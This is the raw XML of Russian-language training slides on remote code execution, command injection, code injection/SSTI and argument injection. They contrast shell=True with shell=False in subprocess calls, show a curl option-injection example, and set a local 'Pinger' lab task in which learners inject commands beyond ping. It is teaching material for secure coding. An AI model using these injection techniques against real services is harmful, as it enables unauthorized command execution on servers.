            <a:ext cx="50673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args = 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"/usr/bin/ping"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"-c"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"1"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ip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run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args, </a:t>
            </a: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shell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7" name="v17-text-70">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B558967B-0095-4A5C-B7FC-781CD679FDB7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4962525"/>
            <a:ext cx="108204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8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При shell=True оболочка разбирает всю строку. При shell=False программа получает готовый argv: значение остаётся одним аргументом. Его формат и смысл всё равно нужно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4198282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Соединитель: уступ 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{216E4340-3580-4F76-B2E2-3209BEC26F4E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:stCxn id="6" idx="3"/>
            <a:endCxn id="12" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6972300" y="4467225"/>
            <a:ext cx="1333500" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="bentConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
            </a:avLst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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="16" name="Соединитель: уступ 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AE4F88A8-F632-4A99-B3F2-7FA5FEE6C132}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:stCxn id="6" idx="3"/>
            <a:endCxn id="9" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="6972300" y="3248025"/>
            <a:ext cx="1333500" cy="1219200"/>
          </a:xfrm>
          <a:prstGeom prst="bentConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
            </a:avLst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EFDC01D2-BDD1-4BC8-9FE3-29B4708A26ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:stCxn id="3" idx="3"/>
            <a:endCxn id="6" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3352800" y="4467225"/>
            <a:ext cx="762000" cy="0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8" name="title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{33D080B2-4887-470B-BC97-71DC7F4A79AF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RCE: удалённое выполнение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EFC36272-CF16-4923-9A61-DFAF64EBFAD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RCE - возможность удалённо запустить управляемый код или команды на целевой системе. Выполнение идёт на сервере с правами приложения.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="process-node-client">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D1A3040C-18E8-4C5C-9045-8242AE500CF4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3381375"/>
            <a:ext cx="2667000" cy="217170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8D9B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client-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{318D7EA1-B03B-4DA3-9C6C-6862964CF4C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="857250" y="4200525"/>
            <a:ext cx="2324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Клиент</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="client-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AF5D10D6-2749-413F-BF7D-44B1F728D4BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="876300" y="4676775"/>
            <a:ext cx="22860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Передаёт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управляемый ввод</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="process-node-app">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E4C7BDF5-ACFB-44C2-ABDA-55ADBC468103}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="3381375"/>
            <a:ext cx="2857500" cy="217170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app-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E46B76F-8F69-4DEA-A7E3-7F0CDF33503F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4286250" y="4200525"/>
            <a:ext cx="2514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Приложение</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="app-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{365F17F1-DACC-48B4-A8AE-923E5EE7D2AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4305300" y="4676775"/>
            <a:ext cx="24765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Небезопасно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обрабатывает ввод</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="process-node-runtime">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1327BED7-5D66-4FEB-BD95-45E3A7EEA995}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8305800" y="2457450"/>
            <a:ext cx="3200400" cy="158115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runtime-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2258125B-DC6C-4805-9042-5F0E23A9B118}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8858250" y="2590800"/>
            <a:ext cx="2495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Интерпретатор</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="runtime-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4355CE2E-4A1E-457D-93B4-F775587206FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8458200" y="3038475"/>
            <a:ext cx="28956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Выполняет код</a:t>
            </a:r>
          </a:p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Code Injection / SSTI</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="process-node-process">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{242AE557-2C61-480B-9443-54084D8485A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8305800" y="4591050"/>
            <a:ext cx="3200400" cy="158115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process-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1CB516C1-10D2-4459-8571-4DEB921C5387}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8858250" y="4724400"/>
            <a:ext cx="2495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Процесс ОС</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="process-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{06B2664A-47D5-4A53-BE3F-A18B0088DC90}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8458200" y="5172075"/>
            <a:ext cx="28956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Выполняет команды</a:t>
            </a:r>
          </a:p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Command Injection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5F5C9FE-D351-4E8B-83A9-8B0691D31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20" name="component-laptop-20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F38D8F23-0D11-4579-A8A3-7C43522D03A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1833562" y="3587353"/>
            <a:ext cx="371475" cy="278606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component-laptop-21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60554608-60AF-4C8B-B1EF-95E101FCFE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1771650" y="3865959"/>
            <a:ext cx="495300" cy="108347"/>
          </a:xfrm>
          <a:prstGeom prst="trapezoid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component-server-22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{374AA910-E7E0-403C-A9D3-6B88A4199B65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5326856" y="3571875"/>
            <a:ext cx="433388" cy="123825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component-server-23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7EB15CC-B68A-496A-8F10-A6861B9F984D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5682853" y="3610571"/>
            <a:ext cx="30956" cy="30956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component-server-24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48C47EBB-174E-4E35-9D84-D89EBA4928B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5326856" y="3726656"/>
            <a:ext cx="433388" cy="123825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component-server-25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{010AE264-8A77-4442-8085-993090309F69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5682853" y="3765352"/>
            <a:ext cx="30956" cy="30956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component-server-26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA25DBE-085B-44B1-A38A-5E2B3762CB1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5326856" y="3881438"/>
            <a:ext cx="433388" cy="123825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component-server-27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA936154-4099-403E-B3FF-A05C438C10A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5682853" y="3920134"/>
            <a:ext cx="30956" cy="30956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component-server-28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{374AA910-E7E0-403C-A9D3-6B88A4199B65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8484394" y="2600325"/>
            <a:ext cx="233362" cy="66675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component-server-29">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7EB15CC-B68A-496A-8F10-A6861B9F984D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8676084" y="2621161"/>
            <a:ext cx="16669" cy="16669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component-server-30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48C47EBB-174E-4E35-9D84-D89EBA4928B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8484394" y="2683669"/>
            <a:ext cx="233362" cy="66675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component-server-31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{010AE264-8A77-4442-8085-993090309F69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8676084" y="2704505"/>
            <a:ext cx="16669" cy="16669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component-server-32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA25DBE-085B-44B1-A38A-5E2B3762CB1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8484394" y="2767012"/>
            <a:ext cx="233362" cy="66675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component-server-33">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA936154-4099-403E-B3FF-A05C438C10A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8676084" y="2787849"/>
            <a:ext cx="16669" cy="16669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component-terminal-34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2316AD9D-ADB8-43C9-BAD9-8D1FD1466429}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8484394" y="4733925"/>
            <a:ext cx="233362" cy="200025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component-terminal-35">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{04862E22-9851-4273-A995-FE2CD5BB4491}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8526066" y="4783931"/>
            <a:ext cx="58341" cy="83344"/>
          </a:xfrm>
          <a:prstGeom prst="chevron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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="36" name="component-terminal-36">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B2636B01-BAE6-4CF4-9EC9-F1FD16EB07CE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8601075" y="4867275"/>
            <a:ext cx="66675" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="17145">
            <a:solidFill>
              <a:srgbClr val="A87D7D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91936162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CCE38F5C-867B-48DC-958C-56C13A45DC0C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Argument Injection: подмена аргументов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4BA93BF5-D1EF-4372-A774-A78511ABFFC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Argument Injection - изменение поведения программы через управляемые пользователем аргументы или опции.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="parser-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{81D7A82B-ADE1-4D9F-BDED-78C8A29CCC96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2686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Кто разбирает ввод</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="parser-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{65D1ED56-2259-441E-AA49-4162C62A1CEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3848100" y="2990850"/>
            <a:ext cx="76581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Сама программа, которая получает argv. Для этого shell не обязателен.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="argument-code">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AD682AF6-AD54-47EB-9D11-718C447F8401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108204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8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subprocess</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l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option = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="180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"--head"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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00" b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значение пользователя</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l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subprocess</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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.run</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="180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 algn="l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80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80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"curl"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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option, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="180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"https://example.org"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="180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8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80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shell</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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80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80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6" name="effect">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{36C7A479-D6F1-4427-A932-45DB8352AF97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1019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curl воспринимает --head как опцию и отправляет HEAD вместо GET.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Рисунок 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9DA2F1CE-3A42-4FEE-8E31-B6F5B2434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11809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A9B1431D-F2F6-424D-ACAC-B921C1AADFDE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Pinger: задание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69128F4-D9E8-4D75-B905-8BE5D2309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269878" y="1809750"/>
            <a:ext cx="6004169" cy="4181475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="v2-text-59">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D66294C4-5EFE-4A08-8753-3894475B872D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="1857375"/>
            <a:ext cx="308610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5000"/>
              </a:lnSpc>
              <a:buNone/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Проверить выполнение команды за пределами обычного ping</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="v2-text-60">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4EFF9305-589B-4C16-8E24-5760A0DB4BE1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="4343400"/>
            <a:ext cx="3086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Совместная практика</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="v2-text-61">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{068851BB-34B5-46CF-9567-C5B579EB615F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="5267325"/>
            <a:ext cx="3086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A9B7C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A9B7C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9B7C6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>127.0.0.1:8086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3523266-790F-43A3-8BDF-E8B2D31E0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788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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Pinger: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="3300" b="1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анализ кода</a:t>
            </a:r>
            <a:endParaRPr sz="3300" b="1" dirty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F9C1B7-EF20-48AF-9312-609D57FD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17" name="v7-text-348">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{11A29DE8-1F2E-46F0-B156-ED66CAEBCA0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6782324" y="1850880"/>
            <a:ext cx="3409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950" b="1" dirty="0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Что видно в коде?</a:t>
            </a:r>
            <a:endParaRPr sz="1950" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C9707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8" name="v7-text-349">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD86ECB4-71FE-4AB4-9F97-83FE474F59A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6782324" y="2612880"/>
            <a:ext cx="4992654" cy="2800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7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IP приходит из JSON</a:t>
            </a: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endParaRPr lang="en-US" sz="1875" b="0" dirty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7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Строку разбирает shell</a:t>
            </a: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endParaRPr lang="en-US" sz="1875" b="0" dirty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7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Пользователь влияет на её</a:t>
            </a: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7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синтаксис до запуска ping</a:t>
            </a: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endParaRPr lang="en-US" sz="1875" b="0" dirty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7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 показанном примере # исключает хвост -c 1 из команды.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="editable-code-83-4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
